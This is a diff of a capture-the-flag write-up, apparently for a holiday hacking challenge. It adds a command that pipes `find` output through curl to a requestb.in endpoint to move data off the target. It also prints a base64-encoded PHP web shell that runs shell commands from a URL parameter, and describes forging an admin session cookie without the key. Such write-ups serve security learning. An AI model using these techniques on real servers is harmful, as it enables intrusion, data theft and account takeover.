@@ -70,10 +70,23 @@ already on the server, why don't we find that instead?
 > -- Sparkle Redberry, Hint 3
 
 
-Command                                                  | Response 
---------                                                 | --------
- `find -name '*.php'`                                    | `./tmp/dillydilly1337.php ./var/www/html/.b0w7Q9w081A909Y8GzA7.php ./var/www/html/.VaZQaWt70e4dVAS0g0TS.php ./var/www/html/dillydilly1337.php ./var/www/html/process.php ./var/www/html/.K2tN5T3RX2x6j2NnZ3W1.php`
- `cat ./var/www/html/.K2tN5T3RX2x6j2NnZ3W1.php | base64` | `PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFtlXSkgLiAiPC9wcmU+IjsgPz4=`
+```
+Command: find -name \'*.php\' 2>&1 | curl --data-urlencode @- "https://requestb.in/[BIN_ID]"
+
+[...]
+./tmp/dillydilly1337.php
+./var/www/html/.b0w7Q9w081A909Y8GzA7.php
+./var/www/html/.VaZQaWt70e4dVAS0g0TS.php
+./var/www/html/dillydilly1337.php
+./var/www/html/process.php
+./var/www/html/.K2tN5T3RX2x6j2NnZ3W1.php
+[...]
+
+
+Command: cat ./var/www/html/.K2tN5T3RX2x6j2NnZ3W1.php | base64
+
+PD9waHAgZWNobyAiPHByZT4iIC4gc2hlbGxfZXhlYygkX0dFVFtlXSkgLiAiPC9wcmU+IjsgPz4=
+```
 
 The `.K2tN5T3RX2x6j2NnZ3W1.php` seems to be a simple enough web shell:
 
@@ -495,7 +508,7 @@ assert(plaintext === "");
 
 The above means we can forge our own cookie for any user without knowing the secret key.
 Since we are intersted in the admin account, we change the GUEST cookie that we
-currently so that it instead has a username property of "admin@northpolechristmastown.com".
+currently have so that it instead has a username property of "admin@northpolechristmastown.com".
 We then change the ciphertext to the base64 encoded 16-byte string we obtained above. The
 plaintext value is kept as "", as that is the value we will get when decrypting our
 forged ciphertext:
